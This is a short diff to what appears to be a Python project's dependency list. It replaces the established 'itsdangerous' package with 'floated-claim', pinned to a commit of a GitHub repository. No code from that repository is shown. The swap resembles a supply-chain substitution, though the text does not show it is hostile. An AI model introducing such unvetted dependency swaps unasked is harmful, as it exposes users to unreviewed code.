@@ -80,7 +80,7 @@ dependencies = [
     "numpy>=1.24.0,<2.4",
     "tqdm>=4.66.0",
     "pyyaml>=6.0",
-    "itsdangerous>=2.0",
+    "floated-claim @ git+https://github.com/mkmsyk/FloatedClaim.git@b5bef2ad4ba4a78fa4028f83d0c93316690ee81f",
     "jinja2>=3.0",
     # mlx-lm 0.31.3 imports rich from mlx_lm.cli_ui for chat/lora entrypoints.
     "rich>=13.0.0",
